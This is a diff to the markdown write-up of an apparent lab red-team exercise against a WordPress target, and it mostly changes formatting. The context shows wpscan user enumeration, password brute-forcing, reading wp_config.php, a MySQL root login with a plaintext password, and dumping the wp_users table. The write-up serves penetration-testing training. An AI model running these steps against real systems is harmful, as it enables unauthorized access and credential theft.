@@ -44,6 +44,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 	-Used Brute Force to guess Michael’s password
   - Command:
       - wpscan --url http://192.168.1.110/wordpress/ --enumerate u
+
 ![redteam2](https://user-images.githubusercontent.com/91024338/143157109-f730c529-0fa3-4934-8e58-291f6b2721f3.JPG)
 ![redteam3](https://user-images.githubusercontent.com/91024338/143157142-49c0c5f1-e7e1-4bc6-9784-072e6d685ee6.JPG)
 ![redteam4](https://user-images.githubusercontent.com/91024338/143157159-d5dc97d7-2bb9-4106-9649-ce2bd54a666b.JPG)
@@ -57,6 +58,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
       - cd var/www/html
       - ls -l
       - nano service.html (Flag1 located) 
+
 ![redteam6](https://user-images.githubusercontent.com/91024338/143157402-7ddab105-f4dc-48ea-9d14-77bf279cd6b9.JPG)
 ![redteam7](https://user-images.githubusercontent.com/91024338/143157412-0322b2b3-9699-4138-88ee-9061cc2c84ea.JPG)
 ![redteam8](https://user-images.githubusercontent.com/91024338/143157425-b9a86fe8-902b-416e-9068-45047c6628fe.JPG)
@@ -83,11 +85,10 @@ Accessing MySQL Database
 -Commands
 	-cd /var/www/html/wordpress
 	-cat wp_config.php
-(screenshot)
 	-mysql -u root -p’R@v3nSecurity’ 
 	-show databases;
 	-use wordpress;
--show tables;
+	-show tables;
 	-select * from wp_posts;
 
 ![redteam10](https://user-images.githubusercontent.com/91024338/143157686-13ad1e0a-309f-433e-b0fe-e992eedce83a.JPG)
@@ -114,7 +115,7 @@ Flag4:715dea6c055b9fe3337544932f2941ce
 	-show tables;
 	-select * from wp_users;
 
- ![redteam14](https://user-images.githubusercontent.com/91024338/143157919-218bf1ae-63f2-4b22-80a1-ac2fc98b7226.JPG)
+![redteam14](https://user-images.githubusercontent.com/91024338/143157919-218bf1ae-63f2-4b22-80a1-ac2fc98b7226.JPG)
 
  
 -Commands:
